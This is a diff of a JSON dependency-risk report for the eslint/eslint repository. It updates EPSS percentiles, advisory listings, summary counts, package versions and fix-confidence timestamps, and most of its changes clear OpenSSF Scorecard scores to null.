         "published_at": "2026-04-22",
         "cve_id": "CVE-2026-41907",
         "epss_score": 0.00337,
-        "epss_percentile": 0.25372,
+        "epss_percentile": 0.25971,
         "is_kev": false,
         "kev_date_added": null,
         "kev_due_date": null,
@@ -2374,7 +2390,7 @@
           "published_at": "2026-04-22",
           "cve_id": "CVE-2026-41907",
           "epss_score": 0.00337,
-          "epss_percentile": 0.25372,
+          "epss_percentile": 0.25971,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -2393,7 +2409,7 @@
         "repo_id": "eslint/eslint",
         "trust_subscore": 0,
         "max_epss_score": 0.00337,
-        "max_epss_percentile": 0.25372,
+        "max_epss_percentile": 0.25971,
         "has_kev_finding": false,
         "candidate_id": "42271a1d972dc6e3"
       },
@@ -2407,7 +2423,7 @@
         "veto_signals": [
           "fix_kind.major"
         ],
-        "evaluated_at": "2026-06-24T06:42:04.601044+00:00",
+        "evaluated_at": "2026-07-21T17:19:18.149354+00:00",
         "engine_version": "fix-confidence-v1.0.0"
       }
     }
@@ -2432,7 +2448,7 @@
         "elliptic"
       ],
       "epss_score": 0.00161,
-      "epss_percentile": 0.05604,
+      "epss_percentile": 0.05706,
       "is_kev": false,
       "kev_known_ransomware": false,
       "kev_due_date": null,
@@ -2456,7 +2472,7 @@
         "lodash.pick"
       ],
       "epss_score": 0.05213,
-      "epss_percentile": 0.91415,
+      "epss_percentile": 0.91599,
       "is_kev": false,
       "kev_known_ransomware": false,
       "kev_due_date": null,
@@ -2465,17 +2481,17 @@
     }
   ],
   "summary": {
-    "total_findings": 41,
-    "total_candidates": 12,
+    "total_findings": 43,
+    "total_candidates": 11,
     "auto_merge_count": 4,
-    "review_required_count": 8,
+    "review_required_count": 7,
     "decline_count": 0,
-    "max_epss_score": 0.05213,
-    "max_epss_cve_id": "CVE-2020-8203",
-    "max_epss_package": "lodash.pick",
+    "max_epss_score": 0.2241,
+    "max_epss_cve_id": "CVE-2021-23337",
+    "max_epss_package": "lodash",
     "kev_count": 0,
     "kev_cve_ids": [],
-    "high_epss_count": 0
+    "high_epss_count": 3
   },
   "project_scores": {
     "prs": 79,
@@ -2562,6 +2578,12 @@
         {
           "advisory_id": "GHSA-3xgq-45jj-v275",
           "package": "cross-spawn",
+          "cvss_score": 7.5,
+          "normalized_score": 75.0
+        },
+        {
+          "advisory_id": "GHSA-52cp-r559-cp3m",
+          "package": "js-yaml",
           "cvss_score": 7.5,
           "normalized_score": 75.0
         },
@@ -2680,12 +2702,6 @@
           "normalized_score": 53.0
         },
         {
-          "advisory_id": "GHSA-h67p-54hq-rp68",
-          "package": "js-yaml",
-          "cvss_score": 5.3,
-          "normalized_score": 53.0
-        },
-        {
           "advisory_id": "GHSA-6v5v-wf23-fmfq",
           "package": "markdown-it",
           "cvss_score": 5.3,
@@ -2696,6 +2712,18 @@
           "package": "qs",
           "cvss_score": 5.3,
           "normalized_score": 53.0
+        },
+        {
+          "advisory_id": "GHSA-7q8q-rj6j-mhjq",
+          "package": "axios",
+          "cvss_score": 5.0,
+          "normalized_score": 50.0
+        },
+        {
+          "advisory_id": "GHSA-mmx7-hfxf-jppx",
+          "package": "axios",
+          "cvss_score": 5.0,
+          "normalized_score": 50.0
         },
         {
           "advisory_id": "GHSA-3p68-rc4w-qgx5",
@@ -2741,16 +2769,12 @@
           "name": "ejs",
           "version": "3.1.10",
           "subscore": 45,
-          "scorecard_score": 3.7,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "knip",
-          "version": "6.18.0",
+          "version": "6.27.0",
           "subscore": 45,
           "scorecard_score": null,
           "scorecard_top_concerns": []
@@ -2759,16 +2783,12 @@
           "name": "yorkie",
           "version": "2.0.0",
           "subscore": 45,
-          "scorecard_score": 2.0,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Maintained (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "@arethetypeswrong/cli",
-          "version": "0.18.4",
+          "version": "0.18.5",
           "subscore": 30,
           "scorecard_score": null,
           "scorecard_top_concerns": []
@@ -2777,12 +2797,8 @@
           "name": "@cypress/webpack-preprocessor",
           "version": "6.0.4",
           "subscore": 30,
-          "scorecard_score": 5.8,
-          "scorecard_top_concerns": [
-            "Dangerous-Workflow (0)",
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "@humanfs/node",
@@ -2809,511 +2825,327 @@
           "name": "@types/esquery",
           "version": "1.5.4",
           "subscore": 30,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "SAST (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "@types/estree",
           "version": "1.0.9",
           "subscore": 30,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "SAST (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "@types/node",
-          "version": "22.20.0",
+          "version": "22.20.1",
           "subscore": 30,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "SAST (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "chai",
           "version": "4.5.0",
           "subscore": 30,
-          "scorecard_score": 6.8,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Security-Policy (0)",
-            "Fuzzing (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "core-js",
           "version": "3.49.0",
           "subscore": 30,
-          "scorecard_score": 5.0,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "cross-spawn",
           "version": "5.1.0",
           "subscore": 30,
-          "scorecard_score": 3.2,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "cross-spawn",
           "version": "7.0.6",
           "subscore": 30,
-          "scorecard_score": 3.2,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "escape-string-regexp",
           "version": "4.0.0",
           "subscore": 30,
-          "scorecard_score": 3.7,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "eslint-plugin-yml",
           "version": "1.19.1",
           "subscore": 30,
-          "scorecard_score": 3.8,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "eslint-rule-extender",
           "version": "0.0.1",
           "subscore": 30,
-          "scorecard_score": 2.9,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "eslump",
           "version": "3.0.0",
           "subscore": 30,
-          "scorecard_score": 3.1,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "esprima",
           "version": "4.0.1",
           "subscore": 30,
-          "scorecard_score": 3.9,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "fast-deep-equal",
           "version": "3.1.3",
           "subscore": 30,
-          "scorecard_score": 2.3,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "CII-Best-Practices (0)",
-            "Security-Policy (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "file-entry-cache",
           "version": "8.0.0",
           "subscore": 30,
-          "scorecard_score": 4.2,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "find-up",
           "version": "4.1.0",
           "subscore": 30,
-          "scorecard_score": 3.7,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)",
-            "Maintained (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "find-up",
           "version": "5.0.0",
           "subscore": 30,
-          "scorecard_score": 3.7,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)",
-            "Maintained (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "fs-teardown",
           "version": "0.1.3",
           "subscore": 30,
-          "scorecard_score": 2.4,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Code-Review (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "glob",
           "version": "10.5.0",
           "subscore": 30,
-          "scorecard_score": 5.3,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "SAST (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "glob",
           "version": "13.0.6",
           "subscore": 30,
-          "scorecard_score": 5.3,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "SAST (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "glob",
           "version": "7.2.3",
           "subscore": 30,
-          "scorecard_score": 5.3,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "SAST (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "ignore",
           "version": "5.3.2",
           "subscore": 30,
-          "scorecard_score": 2.7,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Maintained (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "ignore",
-          "version": "7.0.5",
+          "version": "7.0.6",
           "subscore": 30,
-          "scorecard_score": 2.7,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Maintained (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "ignore",
-          "version": "7.0.5",
+          "version": "7.0.6",
           "subscore": 30,
-          "scorecard_score": 2.7,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Maintained (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "imurmurhash",
           "version": "0.1.4",
           "subscore": 30,
-          "scorecard_score": 2.0,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "SAST (0)",
-            "Maintained (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "jiti",
           "version": "2.7.0",
           "subscore": 30,
-          "scorecard_score": 5.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Fuzzing (0)",
-            "Security-Policy (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "json-stable-stringify-without-jsonify",
           "version": "1.0.1",
           "subscore": 30,
-          "scorecard_score": 1.9,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Maintained (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "lint-staged",
           "version": "11.2.6",
           "subscore": 30,
-          "scorecard_score": 5.6,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "markdown-it",
           "version": "14.1.1",
           "subscore": 30,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Branch-Protection (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "markdown-it",
-          "version": "14.2.0",
+          "version": "14.3.0",
           "subscore": 30,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Branch-Protection (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "markdown-it-container",
           "version": "4.0.0",
           "subscore": 30,
-          "scorecard_score": 3.1,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "markdownlint-cli2",
           "version": "0.22.1",
           "subscore": 30,
-          "scorecard_score": 5.4,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "metascraper-description",
           "version": "5.49.24",
           "subscore": 30,
-          "scorecard_score": 2.4,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Dangerous-Workflow (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "metascraper-image",
           "version": "5.49.24",
           "subscore": 30,
-          "scorecard_score": 2.4,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Dangerous-Workflow (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "metascraper-logo",
           "version": "5.49.24",
           "subscore": 30,
-          "scorecard_score": 2.4,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Dangerous-Workflow (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "metascraper-logo-favicon",
           "version": "5.49.24",
           "subscore": 30,
-          "scorecard_score": 2.4,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Dangerous-Workflow (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "metascraper-title",
           "version": "5.49.24",
           "subscore": 30,
-          "scorecard_score": 2.4,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Dangerous-Workflow (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "minimatch",
           "version": "10.2.5",
           "subscore": 30,
-          "scorecard_score": 5.8,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Pinned-Dependencies (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "minimatch",
           "version": "3.1.5",
           "subscore": 30,
-          "scorecard_score": 5.8,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Pinned-Dependencies (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "minimatch",
           "version": "3.1.5",
           "subscore": 30,
-          "scorecard_score": 5.8,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Pinned-Dependencies (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "minimatch",
           "version": "5.1.9",
           "subscore": 30,
-          "scorecard_score": 5.8,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Pinned-Dependencies (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "minimatch",
           "version": "9.0.9",
           "subscore": 30,
-          "scorecard_score": 5.8,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Pinned-Dependencies (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "minimatch",
           "version": "9.0.9",
           "subscore": 30,
-          "scorecard_score": 5.8,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Pinned-Dependencies (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "natural-compare",
           "version": "1.4.0",
           "subscore": 30,
-          "scorecard_score": 3.9,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Code-Review (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "node-polyfill-webpack-plugin",
           "version": "1.1.4",
           "subscore": 30,
-          "scorecard_score": 3.0,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Pinned-Dependencies (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "optionator",
           "version": "0.9.4",
           "subscore": 30,
-          "scorecard_score": 2.1,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "CII-Best-Practices (0)",
-            "Security-Policy (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "regenerator-runtime",
           "version": "0.14.1",
           "subscore": 30,
-          "scorecard_score": 4.1,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "@eslint/json",
-          "version": "2.0.0",
+          "version": "2.0.1",
           "subscore": 15,
           "scorecard_score": null,
           "scorecard_top_concerns": []
@@ -3322,56 +3154,36 @@
           "name": "c8",
           "version": "11.0.0",
           "subscore": 15,
-          "scorecard_score": 4.0,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "cypress",
           "version": "14.5.4",
           "subscore": 15,
-          "scorecard_score": 5.8,
-          "scorecard_top_concerns": [
-            "Dangerous-Workflow (0)",
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "got",
           "version": "11.8.6",
           "subscore": 15,
-          "scorecard_score": 5.5,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "SAST (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "@babel/core",
           "version": "7.29.7",
           "subscore": 0,
-          "scorecard_score": 7.2,
-          "scorecard_top_concerns": [
-            "Pinned-Dependencies (0)",
-            "SAST (0)",
-            "Fuzzing (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "@babel/preset-env",
           "version": "7.29.7",
           "subscore": 0,
-          "scorecard_score": 7.2,
-          "scorecard_top_concerns": [
-            "Pinned-Dependencies (0)",
-            "SAST (0)",
-            "Fuzzing (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "@eslint-community/eslint-utils",
@@ -3396,7 +3208,7 @@
         },
         {
           "name": "@eslint/config-helpers",
-          "version": "0.6.0",
+          "version": "0.7.0",
           "subscore": 0,
           "scorecard_score": null,
           "scorecard_top_concerns": []
@@ -3410,14 +3222,10 @@
         },
         {
           "name": "@eslint/eslintrc",
-          "version": "3.3.5",
+          "version": "3.3.6",
           "subscore": 0,
-          "scorecard_score": 5.5,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "CII-Best-Practices (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "@eslint/plugin-kit",
@@ -3428,161 +3236,105 @@
         },
         {
           "name": "@typescript-eslint/parser",
-          "version": "8.62.0",
+          "version": "8.65.0",
           "subscore": 0,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Fuzzing (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "ajv",
           "version": "6.15.0",
           "subscore": 0,
-          "scorecard_score": 5.4,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)",
-            "Fuzzing (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "ajv",
           "version": "8.20.0",
           "subscore": 0,
-          "scorecard_score": 5.4,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)",
-            "Fuzzing (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "ajv",
           "version": "8.20.0",
           "subscore": 0,
-          "scorecard_score": 5.4,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)",
-            "Fuzzing (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "ajv",
           "version": "8.20.0",
           "subscore": 0,
-          "scorecard_score": 5.4,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)",
-            "Fuzzing (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "babel-loader",
           "version": "8.4.1",
           "subscore": 0,
-          "scorecard_score": 6.4,
-          "scorecard_top_concerns": [
-            "Pinned-Dependencies (0)",
-            "CII-Best-Practices (0)",
-            "Fuzzing (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "cheerio",
           "version": "0.22.0",
           "subscore": 0,
-          "scorecard_score": 7.7,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Fuzzing (0)",
-            "CII-Best-Practices (2)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "cheerio",
           "version": "1.1.2",
           "subscore": 0,
-          "scorecard_score": 7.7,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Fuzzing (0)",
-            "CII-Best-Practices (2)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "common-tags",
           "version": "1.8.2",
           "subscore": 0,
-          "scorecard_score": 2.2,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "CII-Best-Practices (0)",
-            "Security-Policy (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "debug",
           "version": "2.6.9",
           "subscore": 0,
-          "scorecard_score": 2.6,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "CII-Best-Practices (0)",
-            "Security-Policy (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "debug",
           "version": "3.2.7",
           "subscore": 0,
-          "scorecard_score": 2.6,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "CII-Best-Practices (0)",
-            "Security-Policy (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "debug",
           "version": "4.4.3",
           "subscore": 0,
-          "scorecard_score": 2.6,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "CII-Best-Practices (0)",
-            "Security-Policy (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "escape-string-regexp",
           "version": "1.0.5",
           "subscore": 0,
-          "scorecard_score": 3.7,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "escape-string-regexp",
           "version": "1.0.5",
           "subscore": 0,
-          "scorecard_score": 3.7,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "eslint-plugin-eslint-plugin",
-          "version": "7.4.0",
+          "version": "7.5.0",
           "subscore": 0,
           "scorecard_score": null,
           "scorecard_top_concerns": []
@@ -3598,23 +3350,15 @@
           "name": "eslint-release",
           "version": "3.3.0",
           "subscore": 0,
-          "scorecard_score": 5.2,
-          "scorecard_top_concerns": [
-            "Pinned-Dependencies (0)",
-            "Token-Permissions (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "eslint-scope",
           "version": "5.1.1",
           "subscore": 0,
-          "scorecard_score": 4.9,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "eslint-scope",
@@ -3627,23 +3371,15 @@
           "name": "eslint-visitor-keys",
           "version": "3.4.3",
           "subscore": 0,
-          "scorecard_score": 4.8,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "eslint-visitor-keys",
           "version": "3.4.3",
           "subscore": 0,
-          "scorecard_score": 4.8,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "eslint-visitor-keys",
@@ -3677,375 +3413,239 @@
           "name": "esquery",
           "version": "1.7.0",
           "subscore": 0,
-          "scorecard_score": 3.6,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "esutils",
           "version": "2.0.3",
           "subscore": 0,
-          "scorecard_score": 2.3,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "CII-Best-Practices (0)",
-            "Security-Policy (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "glob-parent",
           "version": "5.1.2",
           "subscore": 0,
-          "scorecard_score": 3.7,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Pinned-Dependencies (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "glob-parent",
           "version": "6.0.2",
           "subscore": 0,
-          "scorecard_score": 3.7,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Pinned-Dependencies (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "globals",
           "version": "14.0.0",
           "subscore": 0,
-          "scorecard_score": 4.3,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "globals",
           "version": "15.15.0",
           "subscore": 0,
-          "scorecard_score": 4.3,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "globals",
           "version": "16.5.0",
           "subscore": 0,
-          "scorecard_score": 4.3,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "gray-matter",
           "version": "4.0.3",
           "subscore": 0,
-          "scorecard_score": 2.5,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "CII-Best-Practices (0)",
-            "Fuzzing (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "is-glob",
           "version": "4.0.3",
           "subscore": 0,
-          "scorecard_score": 3.6,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "Pinned-Dependencies (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "marked",
           "version": "4.3.0",
           "subscore": 0,
-          "scorecard_score": 7.2,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Fuzzing (0)",
-            "SAST (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
